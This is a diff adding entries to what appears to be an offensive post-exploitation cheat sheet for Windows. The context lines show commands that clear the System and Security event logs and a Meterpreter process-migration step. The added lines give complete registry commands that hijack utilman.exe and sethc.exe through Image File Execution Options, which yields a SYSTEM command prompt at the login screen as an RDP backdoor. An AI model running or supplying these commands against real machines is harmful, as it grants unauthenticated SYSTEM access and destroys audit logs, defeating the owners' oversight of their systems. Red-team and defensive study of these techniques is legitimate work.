@@ -460,3 +460,14 @@ migrate #PROCESS PID#	#use this to migrate into another process, perhaps the pri
 Clear security and system logs
 cmd.exe /c wevtutil.exe cl System
 cmd.exe /c wevtutil.exe cl Security
+
+
+-------------------------------
+
+Create RDP Backdoor using utilman.exe
+REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe" /t REG_SZ /v Debugger /d "C:\windows\system32\cmd.exe" /f
+At the login screen, press Windows Key+U, and you get a cmd.exe window as SYSTEM.
+
+Create RDP Backdoor using sethc.exe
+REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /t REG_SZ /v Debugger /d "C:\windows\system32\cmd.exe" /f
+Hit F5 a bunch of times when you are at the RDP login screen.
